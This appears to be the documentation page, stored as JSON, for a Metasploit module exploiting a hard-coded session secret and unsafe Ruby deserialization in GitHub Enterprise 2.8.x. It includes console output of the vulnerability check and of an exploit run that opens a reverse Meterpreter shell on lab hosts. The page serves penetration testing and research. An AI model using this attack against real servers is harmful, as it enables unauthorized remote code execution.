{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/github_enterprise_secret","result":{"data":{"moduleMetadataJson":{"id":"d9e054a8-67ac-5f14-8b46-b0bbe3b13671","name":"Github Enterprise Default Session Secret And Deserialization Vulnerability","fullname":"exploit/linux/http/github_enterprise_secret","description":"This module exploits two security issues in Github Enterprise, version 2.8.0 - 2.8.6.\n        The first is that the session management uses a hard-coded secret value, which can be\n        abused to sign a serialized malicious Ruby object. The second problem is due to the\n        use of unsafe deserialization, which allows the malicious Ruby object to be loaded,\n        and results in arbitrary remote code execution.\n\n        This exploit was tested against version 2.8.0.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/github_enterprise_secret","documentationSlug":"/modules/documentation/exploit/linux/http/github_enterprise_secret"},"documentation":{"html":"<p>This module exploits two security issues found in Github Enterprise 2. The first problem is\nthat the session management uses a hard-coded secret value, which can be abused to sign a\nserialized malicious object. The second problem is that the serialized string is passed to\na <code class=\"language-text\">Marshal.load</code> API call, which deserializes the malicious object, and executes it. A\nmalicious attacker can take advantage of these problems to achieve remote code execution.</p>\n<p>According to exablue.de, this RCE was reported to GitHub, and the researcher was rewarded\n$18,000 total.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>The following versions are affected:</p>\n<ul>\n<li>2.8.0 - 2.8.6.</li>\n</ul>\n<p>For testing purposes, you can download a Github Enterprise image from the following location:</p>\n<p><a href=\"https://enterprise.github.com/releases/\">https://enterprise.github.com/releases/</a></p>\n<p>This module was specifically tested against version 2.8.0, which can be downloaded here:</p>\n<p><a href=\"https://github-enterprise.s3.amazonaws.com/esx/releases/github-enterprise-2.8.0.ova\">https://github-enterprise.s3.amazonaws.com/esx/releases/github-enterprise-2.8.0.ova</a></p>\n<p>Before you install the image, you must have a valid key. Start from here:</p>\n<p><a href=\"https://enterprise.github.com/sn-trial\">https://enterprise.github.com/sn-trial</a></p>\n<p>After signing up for a trial, you should receive an e-mail. The email will instruct you to access\nyour portal account. In there, you can download your github-enterprise.ghl file, which is a key\nto complete installing your Github Enterprise system.</p>\n<h2 id=\"using-githubenterprisesecret\" style=\"position:relative;\"><a href=\"#using-githubenterprisesecret\" aria-label=\"using githubenterprisesecret permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using github<em>enterprise</em>secret</h2>\n<p>The module consists of two features: the <code class=\"language-text\">check</code> command and the <code class=\"language-text\">exploit</code> command.</p>\n<p>The <code class=\"language-text\">check</code> command determines if the host is vulnerable or not by extracting the hash of the\ncookie, and then attempts to create the same hash using the default secret key. If the two match,\nit means the module can tamper the cookie, and that makes the server vulnerable to deserialization.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(github_enterprise_secret) &gt; check\n\n[*] Found cookie value: _gh_manage=BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiRTViZTAwNjg4NDViYmYzNWQzMGZl%0AZTRiYWY2YmU4Mzg2MzQ2NjFjODcxYTAyZDZlZjA0YTQ2MWIzNDBiY2VkMGIG%0AOwBGSSIPY3NyZi50b2tlbgY7AFRJIjFZZ0I5ckVkbWhwclpmNWF5RmVia3Zv%0AQzVKMUVoVUxlRWNEbjRYbHplb2R3PQY7AEY%3D%0A--ab0866fc61ea036b1e83cd65b92c2b6cc5b001ed;, checking to see if it can be tampered...\n[*] Data: BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiRTViZTAwNjg4NDViYmYzNWQzMGZlZTRiYWY2YmU4Mzg2MzQ2NjFjODcxYTAyZDZlZjA0YTQ2MWIzNDBiY2VkMGIGOwBGSSIPY3NyZi50b2tlbgY7AFRJIjFZZ0I5ckVkbWhwclpmNWF5RmVia3ZvQzVKMUVoVUxlRWNEbjRYbHplb2R3PQY7AEY=\n[*] Extracted HMAC: ab0866fc61ea036b1e83cd65b92c2b6cc5b001ed\n[*] Expected HMAC: ab0866fc61ea036b1e83cd65b92c2b6cc5b001ed\n[*] The HMACs match, which means you can sign and tamper the cookie.\n[+] 192.168.146.201:8443 The target is vulnerable.\nmsf exploit(github_enterprise_secret) &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>If vulnerable, the <code class=\"language-text\">exploit</code> command will attempt to gain access of the system:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(github_enterprise_secret) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.146.1:4444 \n[*] Serialized Ruby stager\n[*] Sending serialized Ruby stager...\n[*] Transmitting intermediate stager for over-sized stage...(105 bytes)\n[*] Sending stage (1495599 bytes) to 192.168.146.201\n[*] Meterpreter session 2 opened (192.168.146.1:4444 -&gt; 192.168.146.201:52454) at 2017-03-23 10:11:17 -0500\n[+] Deleted /tmp/htBDuK.bin\n[+] Deleted /tmp/kXgpK.bin\n[*] Connection timed out\n\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"d9e054a8-67ac-5f14-8b46-b0bbe3b13671"}}}